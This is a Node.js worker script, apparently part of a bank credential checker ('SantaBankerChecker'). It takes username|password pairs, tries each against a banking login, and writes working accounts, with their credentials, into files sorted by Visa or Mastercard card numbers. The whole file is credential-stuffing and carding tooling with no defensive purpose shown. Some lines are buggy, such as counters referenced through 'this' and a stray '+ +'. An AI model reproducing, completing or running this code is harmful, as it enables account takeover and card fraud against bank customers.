const { parentPort, workerData, threadId } = require('worker_threads')
const { login } = require('./SantaBankerChecker.js')
const fs = require('fs');

var testadas = 0;
var dies = 0;

if(workerData instanceof Array) {
    workerData.forEach(action => {
        console.log(action);
        var usuario = action.split("|")[0];
        var senha = action.split("|")[1];
        console.log(`usuario = ${usuario}, senha = ${senha}`);
        try {
            var retorno = login(usuario, senha);
            console.log("retorno", retorno);
            this.testadas++;
            let strData = retorno.replace("LIVE|", "LIVE " + action + " > ") + " | INFOS TESTADAS(T): " + this.testadas + " | DIES: " + this.dies + " | THREAD ID: " + threadId;
            strData += "\r\n====================================================================\r\n\r\n";

            if (retorno.indexOf('DIE|') == -1) {
                if (retorno.indexOf('NUMERO: 5') == -1 && retorno.indexOf('NUMERO: 4') == -1) {
                    fs.appendFile("lives_sem_cartao.txt", strData, (err) => {
                        console.log('appendFile error', err);
                    })
                } else if (retorno.indexOf('NUMERO: 5') > -1 && retorno.indexOf('NUMERO: 4') == -1) {
                    fs.appendFile("lives_master.txt", strData, (err) => {
                        console.log('appendFile error', err);
                    })
                } else if (retorno.indexOf('NUMERO: 4') > -1 && retorno.indexOf('NUMERO: 5') == -1) {
                    fs.appendFile("lives_visa.txt", strData, (err) => {
                        console.log('appendFile error', err);
                    })
                } else {
                    fs.appendFile("lives_misturadas_visa_master.txt", strData, (err) => {
                        console.log('appendFile error', err);
                    })
                }
                console.log(retorno.replace("LIVE|", "LIVE " + action + " > ") +  + " | INFOS TESTADAS(T): " + this.testadas + " | DIES: " + this.dies + " | THREAD ID: " + threadId);
            }
            this.dies++;
        }catch (e) {
            console.log('login error', e);
        }
    });
}

//parentPort.postMessage({ welcome: workerData })